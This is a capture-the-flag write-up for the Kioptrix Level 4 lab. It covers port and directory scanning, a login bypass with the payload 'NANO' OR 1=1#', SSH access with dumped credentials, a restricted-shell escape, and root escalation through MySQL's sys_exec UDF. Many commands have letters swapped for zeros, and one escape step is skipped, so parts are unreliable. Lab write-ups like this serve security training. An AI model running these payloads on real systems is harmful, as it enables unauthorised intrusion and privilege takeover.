---
title: Kioptrix Level 4 Write-up
published: 2025-06-22
description: ⭐ NANO IS HERE ⭐
image: "./nobe.png"
tags: [kioptrix4, vulnhub, sql injection, privilege escalation, ctf]
category: Web Security
draft: false
---
> Cover image source: [Source](./nobe.png)


   Intr0ducti0n
---------------

Hell0 Hackers, N4N0 here! 👾
In this write-up, I’ll guide y0u thr0ugh my red teaming j0urney 0f 0wning the **Ki0ptrix Level 4** b0x. This vulnerable machine required a mix 0f web app enumerati0n, privilege escalati0n, and creative thinking t0 reach r00t.

We’ll start with full Nmap scanning, dig int0 the web applicati0n, gain a reverse shell, and finally escalate privileges using a clever MySQL UDF technique that gave us full r00t access. 

Let’s break d0wn every step like a real red teamer 
--------------------
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JesKlpuuqPBZqWHKy68Hqw.png)

Rec0nnaissance
--------------------

We started 0ff with a full p0rt scan using Nmap t0 identify the services running 0n the target:

```
nmap -p- -sC -sV TARGET -oN ki0ptrix4.txt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PLfWQRyNEkRcmqhaaBkthA.png)

We discovered three open ports:

*   **Port 22** → SSH running OpenSSH 4.7p1
*   **Port 80** → HTTP running Apache 2.2.8 with PHP 5.2.4
*   **Port 445** → Samba ver 3.0.28a

LET’s ACsess port 80 And see the website (IpTareget)

![captionless image](https://miro.medium.com/v2/resize:fit:1048/format:webp/1*Zo8lkNw7TkdIFoRmNYMUYQ.png)

🗂️ 1.1 Enumerati0n with Gobuster
---------------------------------

After disc0vering the web server running 0n p0rt 80, I decided to enumerate hidden directories and files using **Gobuster**

Gobuster Command Used:
----------------------

```
gobuster dir -u UR TARGET IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

📁 Interesting Results:
-----------------------

```
/index → Main page (Status: 200)
/images/ → Media assets (Status: 301)
/member → Redirects t0 index.php (Status: 302)
/l0g0ut → Redirects t0 index.php (Status: 302)
/john/ → User-specific direct0ry (Status: 301)
/robert/ → An0ther user direct0ry (Status: 301)

```

 2 : Expl0itati0n — L0gin Page & SQL Injecti0n
------------------------------------------------

During my web enumerati0n phase using **G0buster**, I f0und tw0 user-specified direct0ries:

*   `/john/`
*   `/robert/`

 This suggests that **j0hn** and **r0bert** are valid usernames in the system.

So I th0ught — why n0t try **j0hn** as the username in the l0gin f0rm?

 Crafted Payl0ad:
-------------------

In the l0gin f0rm:

*   **Username**: `john`
*   **Passw0rd**: `NAN0' 0R 1=1#`

0K HERE WE G0 click L0GIN butt0n

![captionless image](https://miro.medium.com/v2/resize:fit:924/format:webp/1*-nn2rne3USaqe_JsfuyqVg.png)

> _Here’s why this works:_
> 
> _The string_ `_' 0R 1=1#_` _is a classic_ **_SQL Injecti0n_** _payload:_

*   `'` closes the initial string in the query.
*   `0R 1=1` forces the c0nditi0n t0 always return **true**.
*   `#` c0mments 0ut the rest 0f the SQL query (like the actual passw0rd check).

![captionless image](https://miro.medium.com/v2/resize:fit:960/format:webp/1*z0yI3a8oQYJ0CM_eQ7OiwQ.gif)

 Backend Query Transf0rmed T0:
--------------------------------

```
SELECT * FROM members WHERE username='j0hn' AND password='NAN0' 0R 1=1#'
```

This bypasses authenticati0n by making the SQL think the c0nditi0n is true — even with0ut the correct passw0rd.

3:GET SHELL
-------------

 SSH Access Using Leaked Credentials
--------------------------------------

After successfully dumping the credentials, we f0und a valid l0gin:
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6wh46FrYrx37hwm84xgyxw.png)

 ```
 Username  :  john  
 Passw0rd  :  MyNameIsJohn
 ```


At this p0int, we attempted t0 SSH int0 the b0x:

```
ssh j0hn@192.168.1.6 <== TARGET IP
```

But we enc0untered an issue:

```
Unable t0 negotiate with 192.168.1.6 p0rt 22: n0 matching h0st key type f0und. Their 0ffer: ssh-rsa, ssh-dss
```

 Fixing the SSH Pr0blem
--------------------------

This is a c0mm0n issue with 0lder SSH servers. The h0st is 0nly 0ffering `ssh-rsa`, which is disabled by default in newer SSH clients.

T0 fix it, we specified the h0st key algorithm manually:

```
ssh -0H0stKeyAlg0rithms=+ssh-rsa j0hn@192.168.1.6
```

 SSH Access Granted:
---------------------

```
j0hn@192.168.1.6's password: 
Welc0me t0 LigG0at Security Systems - We are Watching
== Welc0me LigG0at Empl0yee ==
LigG0at Shell is in place s0 y0u d0n't screw up
Type '?' 0r 'help' t0 get the list 0f all0wed c0mmands
```

We’re inside — but it’s n0t a full shell! 

Bypassing the Restricted Shell
---------------------------------

The shell was clearly restricted — limited c0mmands like `cd`, `ls`, `ech0`, and `help`.

N0 `which`, n0 `bash`, n0 `sudo`.

But thankfully, we n0ticed `ech0` is all0wed. That’s g00d en0ugh t0 craft a smart evasi0n.

We tried this:

```
ech0 0s.system("/bin/bash")
```

 This was detected as f0rbidden syntax.

 But we didn’t give up.

We kept playing with enc0ding, escaping, and eventually…

 BO0M! Once we achieved c0de executi0n and escaped the restricted shell, we

```

export TERM=xterm
```

 N0w we had a stable semi-interactive TTY shell.

4: Privilege Escalation 👾
--------------------------

We navigated to the web root directory:

```
cd /var/www
ls
```

 The following files were discovered:

```
checklogin.php  
database.sql
images
index.php  
```
john  login_success.php  logout.php  member.php  robert
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j1HPYoXzpBiCU-2s5dmXlA.png)

We dumped the content of the `checklogin.php` script:

```
cat checklogin.php
```
This file is responsible for handling the login mechanism on the website. A quick review revealed multiple critical issues:

 VULNERABILITIES SPOTTED:
---------------------------

*    MySQL username: `root`
*    MySQL password: `""` (blank)
*    No password hashing
*    Weak filtering on user input (only the username was sanitized with `mysql_real_escape_string()`)
*    Password was left unsanitized (commented out)
*    Uses insecure `mysql_*` functions (deprecated)

This means:

> _ The login system is fully vulnerable to classic SQL Injection attacks._

We already used the payload:

```
Username: john
Password: NANO' OR 1=1#
```



to bypass the login check.

But there’s more…

Inside the same directory, we found a `database.sql` dump. It could hold hardcoded credentials or give insight into the user management system.

After we confirmed that MySQL logins are accessible, we logged in using:

```
mysql -u root -p
```

# Just pressed enter since password is blank
```
SELECT sys_exec("id");
```


HINT :  INFO BOX: What is `sys_exec()`?

`sys_exec()` is a **User Defined Function (UDF)** in MySQL that allows you to execute OS-level commands **directly from inside the SQL interpreter**.

**Why is it dangerous?**
Because if MySQL is running as `root`, commands like this become possible:

```
SELECT sys_exec("id");
```

 Learn More:
--------------

*    [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

SUCCESS! The user `john` is now part of the `admin` group.

```
SELECT sys_exec("usermod -a -G admin john"); This command adds user john to the admin group, which is part of the sudoers priv.
```

We then validated the result:


```
id
# Output: uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
```

 SUCCESS! The user `john` is now part of the `admin` group.

Esay switching to root:
--

![NANO](https://miro.medium.com/v2/resize:fit:1024/format:webp/1*sGC822S-efJ7EAkDQvZauA.jpeg)

